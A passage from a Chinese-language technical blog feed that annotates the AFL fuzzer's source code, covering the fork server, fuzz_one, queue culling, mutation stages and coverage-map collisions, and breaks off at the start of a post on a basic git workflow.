class="line"></span><br><span class="line">      r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span></span><br><span class="line"><span class="comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span></span><br><span class="line"><span class="comment">         maps - so we should be getting good protection against OOM bugs. */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span></span><br><span class="line"><span class="comment">       before the dump is complete. */</span></span><br><span class="line"></span><br><span class="line">    r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Isolate the process and configure standard descriptors. If out_file is</span></span><br><span class="line"><span class="comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setsid</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">dup2</span>(dev_null_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">dup2</span>(out_fd, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">close</span>(out_fd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(out_dir_fd);</span><br><span class="line">    <span class="built_in">close</span>(dev_null_fd);</span><br><span class="line">    <span class="built_in">close</span>(dev_urandom_fd);</span><br><span class="line">    <span class="built_in">close</span>(<span class="built_in">fileno</span>(plot_file));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should improve performance a bit, since it stops the linker from</span></span><br><span class="line"><span class="comment">       doing extra work post-fork(). */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;LD_BIND_LAZY&quot;</span>)) <span class="built_in">setenv</span>(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set sane defaults for ASAN if nothing else specified. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span></span><br><span class="line"><span class="comment">       point. So, we do this in a very hacky way. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;msan_track_origins=0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 子进程调用一次 execv</span></span><br><span class="line">    <span class="comment">// 运行 afl-gcc 运行的程序</span></span><br><span class="line">    <span class="built_in">execv</span>(target_path, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span></span><br><span class="line"><span class="comment">       falling through. */</span></span><br><span class="line"></span><br><span class="line">    *(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 父进程</span></span><br><span class="line">  <span class="comment">/* Close the unneeded endpoints. */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span></span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 接收到启动的程序的信息</span></span><br><span class="line">  rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 等待子进程</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 很多的SAYF...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h3><p>精简化队列</p>
<ul>
<li>创建一个了temp_v数组，该数组的大小与trace_mini一致，为<code>MAP_SIZE &gt;&gt; 3</code>。</li>
<li>在初始状态下，数组中的bit全为1，每位代表了路径是否被覆盖，为1时表示未被覆盖</li>
<li>temp_v数组用于记录top_rated数组中每个路径的优胜者第一次覆盖的所有路径，即trace_mini数组。</li>
<li>temp_v数组存在的目的其实是用于选择第一次覆盖到该路径的优胜者。这里本质上还是使用了贪心算法，AFL贪心的认为对于每个被命中的路径，遍历时第一次遇到的优胜者就是更favorable，所以那个优胜者的favored才会被置1</li>
<li>之后favored未被标记的测试用例将由<code>mark_as_redundant</code>将其q-&gt;fs_redundant置1，并放入 out_dir&#x2F;queue&#x2F;.state&#x2F;redundant_edges&#x2F; 文件夹中。如果它在后续又被 favored 标记，则从文件夹中删去；反之同理。</li>
</ul>
<h2 id="while-1-fuzz-主循环"><a href="#while-1-fuzz-主循环" class="headerlink" title="while 1: fuzz 主循环"></a>while 1: fuzz 主循环</h2><p>在进行第一轮fuzz后进入fuzz主循环，每一次循环对一个测试用例调用<code>fuzz_one</code>进行测试，对测试用例进行变异，然后通过<code>cull_queue</code>精简队列。AFL会返回执行如下内容，直到停止。</p>
<ol>
<li>cull_queue</li>
<li>如果当前queue_cur为空表示所有的queue都被执行完一轮，从queue头开始新一轮fuzz<ul>
<li>刷新展示界面</li>
<li>如果执行一轮后的queue中的test_case数量与执行前一样，表示此轮fuzz没有效果，则重新调整变异策略</li>
</ul>
</li>
<li>调用<code>fuzz_one</code>对queue_cur指定的测试用例进行测试</li>
<li>移动queue_cur</li>
</ol>
<h3 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz one"></a>fuzz one</h3><p>进行样例fuzz，包含了变异策略</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take the current entry from the queue, fuzz it for a while. This</span></span><br><span class="line"><span class="comment">   function is a tad too long... returns 0 if fuzzed successfully, 1 if</span></span><br><span class="line"><span class="comment">   skipped or bailed out. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调用fuzz_one对queue_cur进行一次变异测试（fuzz_one并不一定真的执行当前queue_cur，</span></span><br><span class="line"><span class="comment">   它有一定的策略；如果不执行，就直接返回1，否则返回0） */</span></span><br><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">fuzz_one</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 len, fd, temp_len, i, j;</span><br><span class="line">  u8  *in_buf, *out_buf, *orig_in, *ex_tmp, *eff_map = <span class="number">0</span>;</span><br><span class="line">  u64 havoc_queued,  orig_hit_cnt, new_hit_cnt;</span><br><span class="line">  u32 splice_cycle = <span class="number">0</span>, perf_score = <span class="number">100</span>, orig_perf, prev_cksum, eff_cnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  u8  ret_val = <span class="number">1</span>, doing_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  a_collect[MAX_AUTO_EXTRA];</span><br><span class="line">  u32 a_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IGNORE_FINDS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In IGNORE_FINDS mode, skip any entries that weren&#x27;t in the</span></span><br><span class="line"><span class="comment">     initial data set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;depth &gt; <span class="number">1</span>) </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 判断pending_favored的值：（这里用到的常量可以在config.h找到）</span></span><br><span class="line"><span class="comment">     1.如果为0，对于queue_cur被fuzz过或者不是favored的，有99%的概率不执行，直接返回1</span></span><br><span class="line"><span class="comment">     2.如果不为0，并且不是dumb_mode、不是favored的、queued_paths&gt;10：</span></span><br><span class="line"><span class="comment">        a.如果queue_cycle大于1，且没有被fuzz过，那么有95%的概率不执行，直接返回1</span></span><br><span class="line"><span class="comment">        b.否则，有75%的概率不执行，直接返回1</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span></span><br><span class="line"><span class="comment">       possibly skip to them at the expense of already-fuzzed or non-favored</span></span><br><span class="line"><span class="comment">       cases. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        <span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Otherwise, still possibly skip non-favored cases, albeit less often.</span></span><br><span class="line"><span class="comment">       The odds of skipping stuff are higher for already-fuzzed inputs and</span></span><br><span class="line"><span class="comment">       lower for never-fuzzed entries. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB) </span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB) </span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^IGNORE_FINDS */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果不是tty模式，输出提示信息并刷新stdout缓冲区 */</span></span><br><span class="line">  <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Fuzzing test case #%u (%u total, %llu uniq crashes found)...&quot;</span>,</span><br><span class="line">         current_entry, queued_paths, unique_crashes);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Map the test case into memory. */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* 这部分主要将case映射到内存的处理：</span></span><br><span class="line"><span class="comment">     1.设置len为queue_cur-&gt;len</span></span><br><span class="line"><span class="comment">     2.打开case对应的文件，并通过mmap映射到内存里，将地址赋值给in_buf和orig_in</span></span><br><span class="line"><span class="comment">     3.分配len大小的内存，并初始化为全0，然后将地址赋值给out_buf</span></span><br><span class="line"><span class="comment">     4.将连续超时计数器subseq_tmout清零</span></span><br><span class="line"><span class="comment">     5.设置cur_depth为queue_cur-&gt;depth</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  fd = <span class="built_in">open</span>(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) </span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">  len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line">  orig_in = in_buf = <span class="built_in">mmap</span>(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (orig_in == MAP_FAILED)</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could mmap() out_buf as MAP_PRIVATE, but we end up clobbering every</span></span><br><span class="line"><span class="comment">     single byte anyway, so it wouldn&#x27;t give us any performance or memory usage</span></span><br><span class="line"><span class="comment">     benefits. */</span></span><br><span class="line"></span><br><span class="line">  out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br><span class="line">  subseq_tmouts = <span class="number">0</span>;</span><br><span class="line">  cur_depth = queue_cur-&gt;depth;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/*******************************************</span></span><br><span class="line"><span class="comment">   * CALIBRATION (only if failed earlier on) *</span></span><br><span class="line"><span class="comment">   *******************************************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 这里开始进入CALIBRATION阶段：</span></span><br><span class="line"><span class="comment">     1.假如当前项有校准错误，并且校准错误次数小于3次，那么就调用calibrate_case再次校准</span></span><br><span class="line"><span class="comment">     2.如果设置了stop_soon，或者res不等于crash_mode：</span></span><br><span class="line"><span class="comment">        a.计数器cur_skipped_paths加1</span></span><br><span class="line"><span class="comment">        b.进入abandon_entry作后续处理</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;cal_failed) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Reset exec_cksum to tell calibrate_case to re-execute the testcase</span></span><br><span class="line"><span class="comment">         avoiding the usage of an invalid trace_bits.</span></span><br><span class="line"><span class="comment">         For more info: https://github.com/AFLplusplus/AFLplusplus/pull/425 */</span></span><br><span class="line"></span><br><span class="line">      queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      res = <span class="built_in">calibrate_case</span>(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || res != crash_mode) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/************</span></span><br><span class="line"><span class="comment">   * TRIMMING *</span></span><br><span class="line"><span class="comment">   ************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 这里开始进入TRIMMING阶段：</span></span><br><span class="line"><span class="comment">     1.如果不处于dumb_mode，且当前项没有被裁剪：</span></span><br><span class="line"><span class="comment">        a.调用trim_case对queue_cur进行trim</span></span><br><span class="line"><span class="comment">        b.设置queue_cur-&gt;trim_done的值为1</span></span><br><span class="line"><span class="comment">        c.重新用queue_cur-&gt;len去设置len的值</span></span><br><span class="line"><span class="comment">     2.将in_buf拷贝len个字节到out_buf中（注意in_buf是trim_case的参数，得到了裁剪）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line"></span><br><span class="line">    u8 res = <span class="built_in">trim_case</span>(argv, queue_cur, in_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don&#x27;t retry trimming, even if it failed. */</span></span><br><span class="line"></span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len) </span><br><span class="line">        len = queue_cur-&gt;len;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/*********************</span></span><br><span class="line"><span class="comment">   * PERFORMANCE SCORE *</span></span><br><span class="line"><span class="comment">   *********************/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 这里开始进入PERFORMANCE SCORE阶段：</span></span><br><span class="line"><span class="comment">     1.对当前项调用calculate_score，算出得分并设置orig_perf和perf_score</span></span><br><span class="line"><span class="comment">     2.如果设置了skip_deterministic，或者当前项被fuzz过，或者passed_det为1（好像也是被fuzz过）</span></span><br><span class="line"><span class="comment">       ，那么跳转到havoc_stage去执行</span></span><br><span class="line"><span class="comment">     3.如果执行路径校验和，超过此主实例的范围，那么也跳转到havoc_stage去执行</span></span><br><span class="line"><span class="comment">     4.若没跳走，设置doing_det的值为1（位于fuzz_one中的一个局部变量）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  orig_perf = perf_score = <span class="built_in">calculate_score</span>(queue_cur);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span></span><br><span class="line"><span class="comment">     this entry ourselves (was_fuzzed), or if it has gone through deterministic</span></span><br><span class="line"><span class="comment">     testing in earlier, resumed runs (passed_det). */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span></span><br><span class="line"><span class="comment">     for this master instance. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line"></span><br><span class="line">  doing_det = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 变异...</span></span><br></pre></td></tr></table></figure>

<h3 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h3><p>变异的主要类型如下：</p>
<ul>
<li>bitflip，按位翻转，1变为0，0变为1</li>
<li>arithmetic，整数加&#x2F;减算术运算</li>
<li>interest，把一些特殊内容替换到原文件中</li>
<li>dictionary，把自动生成或用户提供的token替换&#x2F;插入到原文件中</li>
<li>havoc，大破坏，此阶段会对原文件进行大量变异，具体见下文</li>
<li>splice，绞接，此阶段会将两个文件拼接起来得到一个新的文件</li>
</ul>
<p>bitflip, arithmetic, interest, dictionary是非dumb mode（-d）和主fuzzer（-M）会进行的操作，由于其变异方式没有随机性，所以也称为deterministic fuzzing；</p>
<p>havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p>
<h3 id="effector-map"><a href="#effector-map" class="headerlink" title="effector map"></a>effector map</h3><p>如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p>
<p>比如解析elf文件程序，我们将其magic num给改了，就会导致程序结果大不相同</p>
<h3 id="havoc"><a href="#havoc" class="headerlink" title="havoc"></a>havoc</h3><p>对于dumb mode或者从fuzzer来说，则是直接从这一阶段开始。</p>
<p>havoc，顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成：</p>
<ul>
<li>随机选取某个bit进行翻转</li>
<li>随机选取某个byte，将其设置为随机的interesting value</li>
<li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li>
<li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li>
<li>随机选取某个byte，对其减去一个随机数</li>
<li>随机选取某个byte，对其加上一个随机数</li>
<li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li>
<li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li>
<li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li>
<li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li>
<li>随机选取某个byte，将其设置为随机数</li>
<li>随机删除一段bytes</li>
<li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li>
<li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li>
<li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li>
<li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li>
</ul>
<h2 id="覆盖率"><a href="#覆盖率" class="headerlink" title="覆盖率"></a>覆盖率</h2><p>共享内存：<code>MAP_SIZE=64K</code>，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      <span class="number">1</span>,<span class="number">000</span> | <span class="number">0.75</span>%            | giflib, lzo</span><br><span class="line">      <span class="number">2</span>,<span class="number">000</span> | <span class="number">1.5</span>%             | zlib, tar, xz</span><br><span class="line">      <span class="number">5</span>,<span class="number">000</span> | <span class="number">3.5</span>%             | libpng, libwebp</span><br><span class="line">     <span class="number">10</span>,<span class="number">000</span> | <span class="number">7</span>%               | libxml</span><br><span class="line">     <span class="number">20</span>,<span class="number">000</span> | <span class="number">14</span>%              | sqlite</span><br><span class="line">     <span class="number">50</span>,<span class="number">000</span> | <span class="number">30</span>%              | -</span><br></pre></td></tr></table></figure>

<p>如果一个目标过于复杂，那么AFL状态面板中的map_density信息就会有相应的提示</p>
<p>众所周知：afl是基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。但是如果程序存在if语句，并且if语句存在一定的条件，甚至会导致死循环，对覆盖率的影响？</p>
<p>如果用户想提供一个后处理算法，仅需将其写进 afl_postprocess 函数，并编译成动态库，通过 AFL_POST_LIBRARY 环境变量传递给 fuzzer。有点像插件的作用</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://rk700.github.io/2017/12/28/afl-internals/">AFL内部实现细节小记</a></li>
<li><a href="https://eternalsakura13.com/2020/08/23/afl/">sakuraのAFL源码全注释</a></li>
<li><a href="https://hicookie.me/2019/09/18/AFL-Learning/">AFL-Learning</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>#Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>git-work-flows</title>
    <url>/2023/11/20/git-workflow/</url>
    <content><![CDATA[<blockquote>
<p>git工作流，持续踩坑</p>
</blockquote>
<span id="more"></span>

<p>因为我同时使用两个操作昔日，因此github仓库就产生一个同步的问题。但是只会 <code>add commit push</code> 三步，因此学习一下</p>
<p>工作区：本地文件。git clone 下载到工作区，git pull 更新到工作区<br>暂存区：add 提交到暂存区。<br>本地仓库： commit 提交到本地仓库。fetch 从远程更新到本地仓库<br>远程仓库：push 提交到远程仓库。</p>
<h2 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h2><ol>
<li>git clone 后切换分支</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;remote&gt;</span><br><span class="line">git checkout -b feature/windows</span><br><span class="line">git branch -a</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>写点东西提交</li>
</ol>
